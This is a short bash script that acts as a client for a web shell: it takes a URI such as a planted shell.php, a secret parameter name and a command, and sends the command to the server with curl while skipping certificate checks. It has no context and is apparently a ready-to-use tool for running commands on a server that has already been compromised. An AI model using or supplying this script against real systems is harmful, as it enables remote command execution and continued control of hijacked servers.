#!/bin/bash
if [ -z "$3" ];then printf "\nSyntax: $0 <URI|https://www.example.com/shell.php> <PARAM|9c772bfc211644fa849a969a3b082404> <CMD|pwd>\n\n"
	else
URI=$1; PARAM=$2; CMD="$3";
curl -k --data "$PARAM=$CMD" $URI
fi
